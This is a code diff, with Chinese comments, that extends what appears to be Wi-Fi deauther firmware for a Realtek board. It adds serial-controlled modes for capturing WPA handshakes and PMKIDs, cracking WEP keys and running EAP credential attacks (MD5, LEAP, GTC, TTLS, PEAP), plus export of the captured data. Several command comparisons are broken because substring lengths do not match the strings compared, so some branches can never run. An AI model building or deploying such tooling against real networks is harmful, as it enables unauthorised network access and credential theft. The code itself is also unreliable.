@@ -1,6 +1,10 @@
 #include "vector"
 #include "wifi_conf.h"
 #include "wifi_cust_tx.h"
+#include "wifi_handshake_capture.h"
+#include "wifi_wep_crack.h"
+#include "wifi_eap_attack.h"
+#include "error_handler.h"
 #include "wifi_drv.h"
 #include "debug.h"
 #include "WiFi.h"
@@ -75,6 +79,18 @@ bool secured=false;
 //"00:E0:4C:01:02:03"
 __u8 customMac[8]={0x00,0xE0,0x4C,0x01,0x02,0x03,0x00,0x00};
 bool useCustomMac=false;
+
+// 握手包捕获相关变量
+bool handshake_capture_mode = false;
+uint32_t handshake_capture_start_time = 0;
+
+// WEP破解相关变量
+bool wep_crack_mode = false;
+uint32_t wep_crack_start_time = 0;
+
+// EAP攻击相关变量
+bool eap_attack_mode = false;
+uint32_t eap_attack_start_time = 0;
 //int allChannels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11};
 extern u8 rtw_get_band_type(void);
 #define FRAMES_PER_DEAUTH 5
@@ -332,6 +348,16 @@ void setup() {
   int channel;
   wifi_get_channel(&channel);
 
+  // 初始化握手包捕获系统
+  init_handshake_capture();
+  // 初始化WEP破解系统
+  init_wep_crack();
+  // 初始化EAP攻击系统
+  init_eap_attack();
+  // 初始化错误处理系统
+  DEBUG_SER_PRINT("Error handling system initialized\n");
+  wifi_rx_init();
+
   digitalWrite(LED_B, HIGH);
 }
 String ssid="";
@@ -546,9 +572,214 @@ void loop() {
         Serial1.print(String(scan_results[i].rssi) + "\n");
       }
       
+    }else if(readString.substring(0,8)=="HANDSHAKE"){
+      // 握手包捕获命令
+      if(readString.substring(9,11)=="ON"){
+        enable_handshake_capture();
+        wifi_rx_start_monitor();
+        handshake_capture_mode = true;
+        handshake_capture_start_time = millis();
+        Serial1.print("HANDSHAKE:STARTED\n");
+        Serial.print("HANDSHAKE:STARTED\n");
+        DEBUG_SER_PRINT("Handshake capture started\n");
+      }else if(readString.substring(9,12)=="OFF"){
+        disable_handshake_capture();
+        wifi_rx_stop_monitor();
+        handshake_capture_mode = false;
+        Serial1.print("HANDSHAKE:STOPPED\n");
+        Serial.print("HANDSHAKE:STOPPED\n");
+        DEBUG_SER_PRINT("Handshake capture stopped\n");
+      }else if(readString.substring(9,12)=="STAT"){
+        // 返回握手包捕获状态
+        uint32_t total_count = get_handshake_count();
+        uint32_t complete_count = get_complete_handshake_count();
+        uint32_t pmkid_count = get_pmkid_count();
+        String status = "HANDSHAKE:STAT|TOTAL:" + String(total_count) + "|COMPLETE:" + String(complete_count) + "|PMKID:" + String(pmkid_count) + "|ACTIVE:" + String(handshake_capture_mode ? "YES" : "NO") + "\n";
+        Serial1.print(status);
+        Serial.print(status);
+      }else if(readString.substring(9,12)=="EXPORT"){
+        // 导出所有握手包数据
+        export_all_handshakes();
+        Serial1.print("HANDSHAKE:EXPORTED\n");
+        Serial.print("HANDSHAKE:EXPORTED\n");
+      }else if(readString.substring(9,12)=="CLEAR"){
+        // 清除所有握手包数据
+        clear_all_handshakes();
+        Serial1.print("HANDSHAKE:CLEARED\n");
+        Serial.print("HANDSHAKE:CLEARED\n");
+      }else if(readString.substring(9,13)=="PMKID"){
+        // 导出PMKID数据
+        export_all_pmkids();
+        Serial1.print("HANDSHAKE:PMKID_EXPORTED\n");
+        Serial.print("HANDSHAKE:PMKID_EXPORTED\n");
+      }
+      
+    }else if(readString.substring(0,3)=="WEP"){
+      // WEP破解命令
+      if(readString.substring(4,6)=="ON"){
+        enable_wep_crack();
+        wifi_rx_start_monitor();
+        wep_crack_mode = true;
+        wep_crack_start_time = millis();
+        Serial1.print("WEP:STARTED\n");
+        Serial.print("WEP:STARTED\n");
+        DEBUG_SER_PRINT("WEP crack started\n");
+      }else if(readString.substring(4,7)=="OFF"){
+        disable_wep_crack();
+        wifi_rx_stop_monitor();
+        wep_crack_mode = false;
+        Serial1.print("WEP:STOPPED\n");
+        Serial.print("WEP:STOPPED\n");
+        DEBUG_SER_PRINT("WEP crack stopped\n");
+      }else if(readString.substring(4,7)=="STAT"){
+        // 返回WEP破解状态
+        uint32_t total_sessions = get_wep_session_count();
+        uint32_t active_sessions = get_active_wep_sessions();
+        uint32_t cracked_sessions = get_cracked_wep_sessions();
+        String status = "WEP:STAT|TOTAL:" + String(total_sessions) + "|ACTIVE:" + String(active_sessions) + "|CRACKED:" + String(cracked_sessions) + "|ACTIVE:" + String(wep_crack_mode ? "YES" : "NO") + "\n";
+        Serial1.print(status);
+        Serial.print(status);
+        
+        // 发送详细统计信息
+        String detailed_status = get_wep_crack_status();
+        Serial1.print("WEP:DETAIL:");
+        Serial1.println(detailed_status);
+        Serial.print("WEP:DETAIL:");
+        Serial.println(detailed_status);
+      }else if(readString.substring(4,7)=="EXPORT"){
+        // 导出所有WEP数据
+        export_all_wep_data();
+        Serial1.print("WEP:EXPORTED\n");
+        Serial.print("WEP:EXPORTED\n");
+      }else if(readString.substring(4,7)=="CLEAR"){
+        // 清除所有WEP数据
+        clear_all_wep_data();
+        Serial1.print("WEP:CLEARED\n");
+        Serial.print("WEP:CLEARED\n");
+      }else if(readString.substring(4,7)=="ALGO"){
+        // 设置WEP破解算法
+        String algo_str = readString.substring(8);
+        int algo = algo_str.toInt();
+        if (algo >= 0 && algo <= 5) {
+          current_crack_algorithm = (WEPCrackAlgorithm)algo;
+          Serial1.print("WEP:ALGO:");
+          Serial1.print(algo);
+          Serial1.print("\n");
+          Serial.print("WEP:ALGO:");
+          Serial.print(algo);
+          Serial.print("\n");
+        }
+      }
+      
+    }else if(readString.substring(0,3)=="EAP"){
+      // EAP攻击命令
+      if(readString.substring(4,7)=="MD5"){
+        enable_eap_attack(EAP_ATTACK_MD5);
+        wifi_rx_start_monitor();
+        eap_attack_mode = true;
+        eap_attack_start_time = millis();
+        Serial1.print("EAP:MD5_STARTED\n");
+        Serial.print("EAP:MD5_STARTED\n");
+        DEBUG_SER_PRINT("EAP MD5 attack started\n");
+      }else if(readString.substring(4,8)=="LEAP"){
+        enable_eap_attack(EAP_ATTACK_LEAP);
+        wifi_rx_start_monitor();
+        eap_attack_mode = true;
+        eap_attack_start_time = millis();
+        Serial1.print("EAP:LEAP_STARTED\n");
+        Serial.print("EAP:LEAP_STARTED\n");
+        DEBUG_SER_PRINT("EAP LEAP attack started\n");
+      }else if(readString.substring(4,7)=="GTC"){
+        enable_eap_attack(EAP_ATTACK_GTC);
+        wifi_rx_start_monitor();
+        eap_attack_mode = true;
+        eap_attack_start_time = millis();
+        Serial1.print("EAP:GTC_STARTED\n");
+        Serial.print("EAP:GTC_STARTED\n");
+        DEBUG_SER_PRINT("EAP GTC attack started\n");
+      }else if(readString.substring(4,8)=="TTLS"){
+        enable_eap_attack(EAP_ATTACK_TTLS);
+        wifi_rx_start_monitor();
+        eap_attack_mode = true;
+        eap_attack_start_time = millis();
+        Serial1.print("EAP:TTLS_STARTED\n");
+        Serial.print("EAP:TTLS_STARTED\n");
+        DEBUG_SER_PRINT("EAP TTLS attack started\n");
+      }else if(readString.substring(4,8)=="PEAP"){
+        enable_eap_attack(EAP_ATTACK_PEAP);
+        wifi_rx_start_monitor();
+        eap_attack_mode = true;
+        eap_attack_start_time = millis();
+        Serial1.print("EAP:PEAP_STARTED\n");
+        Serial.print("EAP:PEAP_STARTED\n");
+        DEBUG_SER_PRINT("EAP PEAP attack started\n");
+      }else if(readString.substring(4,7)=="OFF"){
+        disable_eap_attack();
+        wifi_rx_stop_monitor();
+        eap_attack_mode = false;
+        Serial1.print("EAP:STOPPED\n");
+        Serial.print("EAP:STOPPED\n");
+        DEBUG_SER_PRINT("EAP attack stopped\n");
+      }else if(readString.substring(4,7)=="STAT"){
+        // 返回EAP攻击状态
+        uint32_t total_sessions = get_eap_session_count();
+        uint32_t active_sessions = get_active_eap_sessions();
+        uint32_t captured_sessions = get_captured_eap_sessions();
+        String attack_type = eap_type_to_string(get_current_attack_type());
+        String status = "EAP:STAT|TOTAL:" + String(total_sessions) + 
+                       "|ACTIVE:" + String(active_sessions) + 
+                       "|CAPTURED:" + String(captured_sessions) + 
+                       "|TYPE:" + attack_type + 
+                       "|ACTIVE:" + String(eap_attack_mode ? "YES" : "NO") + "\n";
+        Serial1.print(status);
+        Serial.print(status);
+      }else if(readString.substring(4,7)=="EXPORT"){
+        // 导出所有EAP数据
+        export_all_eap_data();
+        Serial1.print("EAP:EXPORTED\n");
+        Serial.print("EAP:EXPORTED\n");
+      }else if(readString.substring(4,7)=="CLEAR"){
+        // 清除所有EAP数据
+        clear_all_eap_data();
+        Serial1.print("EAP:CLEARED\n");
+        Serial.print("EAP:CLEARED\n");
+      }
+      
     }
     readString="";
 
+  }
+  
+  // 定期清理过期的握手包会话
+  if (handshake_capture_mode && (millis() - handshake_capture_start_time) % 30000 < 100) {
+    cleanup_old_sessions();
+  }
+  
+  // 定期清理过期的WEP破解会话
+  if (wep_crack_mode && (millis() - wep_crack_start_time) % 30000 < 100) {
+    cleanup_old_wep_sessions();
+  }
+  
+  // 定期清理过期的EAP攻击会话
+  if (eap_attack_mode && (millis() - eap_attack_start_time) % 30000 < 100) {
+    cleanup_old_eap_sessions();
+  }
+  
+  // 系统健康监控
+  monitor_eap_system_health();
+  
+  // 定期打印系统状态
+  static uint32_t last_status_print = 0;
+  if (millis() - last_status_print > 300000) { // 每5分钟
+    print_system_status();
+    last_status_print = millis();
+  }
+  
+  // 定期检查内存使用
+  static uint32_t last_memory_check = 0;
+  if (millis() - last_memory_check > 60000) { // 每1分钟
+    check_memory_usage();
+    last_memory_check = millis();
   }
   
   if (deauth_wifis.size() > 0) {
